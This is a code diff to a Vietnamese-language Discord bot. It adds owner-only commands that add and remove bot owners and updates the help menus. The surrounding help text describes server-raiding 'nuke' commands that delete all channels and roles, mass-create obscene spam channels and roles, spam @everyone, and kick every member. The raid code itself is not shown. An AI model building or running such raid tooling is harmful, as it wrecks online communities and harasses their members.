@@ -824,6 +824,89 @@ async def set_server_icon_error(ctx, error):
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
 
+# ==================== LỆNH THÊM/XÓA OWNER ====================
+@bot.command(name="addowner")
+@is_bot_owner()
+async def addowner(ctx, target: discord.User):
+    """Thêm người dùng vào danh sách Owner bot"""
+    # Kiểm tra xem user đã là owner chưa
+    if target.id in BOT_OWNERS:
+        embed = discord.Embed(
+            title="❌ ĐÃ TỒN TẠI!",
+            description=f"🎀 **{target}** đã là Owner của bot rồi!\nKhông cần thêm lại nữa nhé Boss! 💕",
+            color=0xFF007F
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Thêm vào danh sách BOT_OWNERS
+    BOT_OWNERS.append(target.id)
+    
+    embed = discord.Embed(
+        title="✅ THÊM OWNER THÀNH CÔNG!",
+        description=(
+            f"👑 **{target}** đã được thêm vào danh sách Owner bot thành công!\n\n"
+            f"✨ Từ bây giờ, **{target.mention}** có toàn quyền sử dụng tất cả lệnh của bot trong không gian GENIUS AI 4.0 rực rỡ!\n\n"
+            f"💖 Danh sách Owner hiện tại: `{len(BOT_OWNERS)}` người"
+        ),
+        color=0x00FF00
+    )
+    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 🌸")
+    await ctx.send(embed=embed)
+
+@addowner.error
+async def addowner_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+@bot.command(name="deleteowner")
+@is_bot_owner()
+async def deleteowner(ctx, target: discord.User):
+    """Xóa người dùng khỏi danh sách Owner bot"""
+    # Kiểm tra nếu là owner cuối cùng
+    if len(BOT_OWNERS) <= 1:
+        embed = discord.Embed(
+            title="❌ KHÔNG THỂ XÓA!",
+            description="🔥 Không thể xóa Owner cuối cùng của bot!\nPhải có ít nhất 1 Owner để điều hành bot trong GENIUS AI 4.0. 💖",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Kiểm tra xem user có phải là owner không
+    if target.id not in BOT_OWNERS:
+        embed = discord.Embed(
+            title="❌ KHÔNG TÌM THẤY!",
+            description=f"🎀 **{target}** không phải là Owner của bot!\nVui lòng kiểm tra lại danh sách Owner nhé Boss! 💕",
+            color=0xFF007F
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Xóa khỏi danh sách BOT_OWNERS
+    BOT_OWNERS.remove(target.id)
+    
+    embed = discord.Embed(
+        title="🗑️ XÓA OWNER THÀNH CÔNG!",
+        description=(
+            f"📌 **{target}** đã bị xóa khỏi danh sách Owner bot thành công!\n\n"
+            f"⚡ Từ bây giờ, **{target.mention}** không còn quyền sử dụng các lệnh đặc biệt của bot nữa.\n\n"
+            f"💖 Danh sách Owner hiện tại: `{len(BOT_OWNERS)}` người"
+        ),
+        color=0xFF9900
+    )
+    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 🌸")
+    await ctx.send(embed=embed)
+
+@deleteowner.error
+async def deleteowner_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
 # ==================== HỆ THỐNG NHÂN CÁCH ====================
 PERSONAS = {
     1: {
@@ -853,6 +936,7 @@ PERSONAS = {
 async def on_ready():
     print(f"Logged in as {bot.user} (ID: {bot.user.id})")
     print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Bảo trong GENIUS AI 4.0!")
+    print(f"👑 Danh sách Owner: {BOT_OWNERS}")
 
 # ==================== KHU VUI CHƠI & LỆNH MINIGAME CHO MEMBER ====================
 @bot.command(name="work")
@@ -982,24 +1066,28 @@ async def setup(ctx):
             "   └ *Hiển thị bảng cẩm nang điều hành chi tiết.*\n\n"
             "🔹 **11. `l!ban @user [lý do]`**\n"
             "   └ *Trục xuất vĩnh viễn thành viên vi phạm khỏi vương quốc GENIUS AI 4.0.*\n\n"
+            "🔹 **12. `l!addowner @user`**\n"
+            "   └ *Thêm người dùng vào danh sách Owner bot.*\n\n"
+            "🔹 **13. `l!deleteowner @user`**\n"
+            "   └ *Xóa người dùng khỏi danh sách Owner bot.*\n\n"
             "💥 **HỆ THỐNG NUKE & PHÁ HỦY (ĐỘC QUYỀN BOSS BẢO):**\n"
-            "🔹 **12. `l!nuke`**\n"
+            "🔹 **14. `l!nuke`**\n"
             "   └ *Xóa toàn bộ kênh, tạo 100 kênh mới, spam tin nhắn phá hủy, đổi tên và avatar.*\n\n"
-            "🔹 **13. `l!spamchannels [số lượng]`**\n"
+            "🔹 **15. `l!spamchannels [số lượng]`**\n"
             "   └ *Tự động tạo hàng loạt kênh spam tục tĩu (Tối đa 200).*\n\n"
-            "🔹 **14. `l!spameveryone`**\n"
+            "🔹 **16. `l!spameveryone`**\n"
             "   └ *Spam thẻ @everyone đồng loạt ở toàn bộ kênh văn bản.*\n\n"
-            "🔹 **15. `l!deleteallchannels`**\n"
+            "🔹 **17. `l!deleteallchannels`**\n"
             "   └ *Xóa sạch sẽ toàn bộ kênh trong server.*\n\n"
-            "🔹 **16. `l!spamroles [số lượng]`**\n"
+            "🔹 **18. `l!spamroles [số lượng]`**\n"
             "   └ *Tạo hàng loạt vai trò spam tục tĩu (Tối đa 250).*\n\n"
-            "🔹 **17. `l!deleteallroles`**\n"
+            "🔹 **19. `l!deleteallroles`**\n"
             "   └ *Xóa toàn bộ vai trò (ngoại trừ @everyone).*\n\n"
-            "🔹 **18. `l!kickall`**\n"
+            "🔹 **20. `l!kickall`**\n"
             "   └ *Trục xuất toàn bộ thành viên (ngoại trừ bot và các chủ nhân tối cao).*\n\n"
-            "🔹 **19. `l!setservername [tên mới]`**\n"
+            "🔹 **21. `l!setservername [tên mới]`**\n"
             "   └ *Thay đổi tên hiển thị của máy chủ lập tức.*\n\n"
-            "🔹 **20. `l!setservericon [url]`**\n"
+            "🔹 **22. `l!setservericon [url]`**\n"
             "   └ *Cập nhật hình ảnh biểu tượng (icon) mới cho server.*"
         ),
         color=0xFF69B4
@@ -1293,6 +1381,8 @@ async def help_command(ctx):
             "• `l!on` / `l!off` - Bật/tắt phản hồi tự động của bot\n"
             "• `l!stats` - Xem thông số server\n"
             "• `l!ban @user [lý do]` - Trục xuất thành viên\n"
+            "• `l!addowner @user` - Thêm Owner bot\n"
+            "• `l!deleteowner @user` - Xóa Owner bot\n"
             "• `l!nuke` - Xóa kênh, tạo 100 kênh mới, spam, đổi tên và avatar\n"
             "• `l!spamchannels [số lượng]` - Tạo nhiều kênh spam\n"
             "• `l!spameveryone` - Spam thông điệp trong tất cả kênh text\n"
